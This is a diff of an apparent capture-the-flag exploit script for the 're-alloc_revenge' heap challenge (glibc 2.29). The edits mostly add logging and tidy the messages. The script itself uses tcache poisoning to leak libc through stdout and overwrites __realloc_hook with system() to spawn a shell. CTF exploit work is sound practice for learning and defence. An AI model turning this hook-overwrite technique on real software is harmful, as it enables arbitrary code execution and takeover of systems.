@@ -27,9 +27,9 @@ leak_dec = lambda r, offset=0: int(r, 10) - offset
 A = lambda len=1, c=b'A': c * len
 z = lambda len=1, c=b'\0': c * len
 
-exe = ELF("re-alloc_revenge_patched")
-libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
-ld = ELF("./ld-2.29.so")
+exe = ELF("re-alloc_revenge_patched", checksec=False)
+libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so", checksec=False)
+ld = ELF("./ld-2.29.so", checksec=False)
 
 context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
 context.binary = exe
@@ -77,7 +77,7 @@ def rfree(index):
 attempt = 0
 while True:
     attempt += 1
-    print("----------> Attempt", attempt)
+    print("\n----------> Attempt", attempt)
     p = conn()
 
     # Save address to tcache bin 0x80
@@ -145,7 +145,7 @@ while True:
     realloc(0, 0x40)
     rfree(0)
 
-    print("Take one chunk frm tcache bin 0x60 so that it points to stdout")
+    print("Take one chunk from tcache bin 0x60, stdout ready for allocation")
     alloc(0, 0x50, z(0x10))
 
     print("Clear index 0")
@@ -177,6 +177,7 @@ while True:
             p.close()
             continue
     except:
+        print("Failed to leak libc")
         p.close()
         continue
 
@@ -193,7 +194,9 @@ while True:
     rfree(1)
 
     print("Overwrite fd to realloc hook - 0x10")
-    alloc(1, 0x60, flat(z(0x18), 0x51, libc.symbols['__realloc_hook'] - 0x10))
+    realloc_hook = libc.symbols['__realloc_hook']
+    lg("realloc hook", realloc_hook)
+    alloc(1, 0x60, flat(z(0x18), 0x51, realloc_hook - 0x10))
     rfree(1)
 
     print("Clear index 1")
@@ -201,10 +204,12 @@ while True:
     realloc(1, 0x10)
     rfree(1)
 
-    print("Allocate to index 1 and write /bin/sh + system()")
-    alloc(1, 0x40, flat(b'/bin/sh\0', 0, libc.symbols['system']))
+    print("Allocate to index 1 and write /bin/sh + system() to __realloc_hook-0x10")
+    system = libc.symbols['system']
+    lg("system", system)
+    alloc(1, 0x40, flat(b'/bin/sh\0', 0, system))
 
-    print("free index 1 to spawn shell")
+    print("Free index 1 to spawn shell:")
     rfree(1)
 
     rr(p, 0.5)
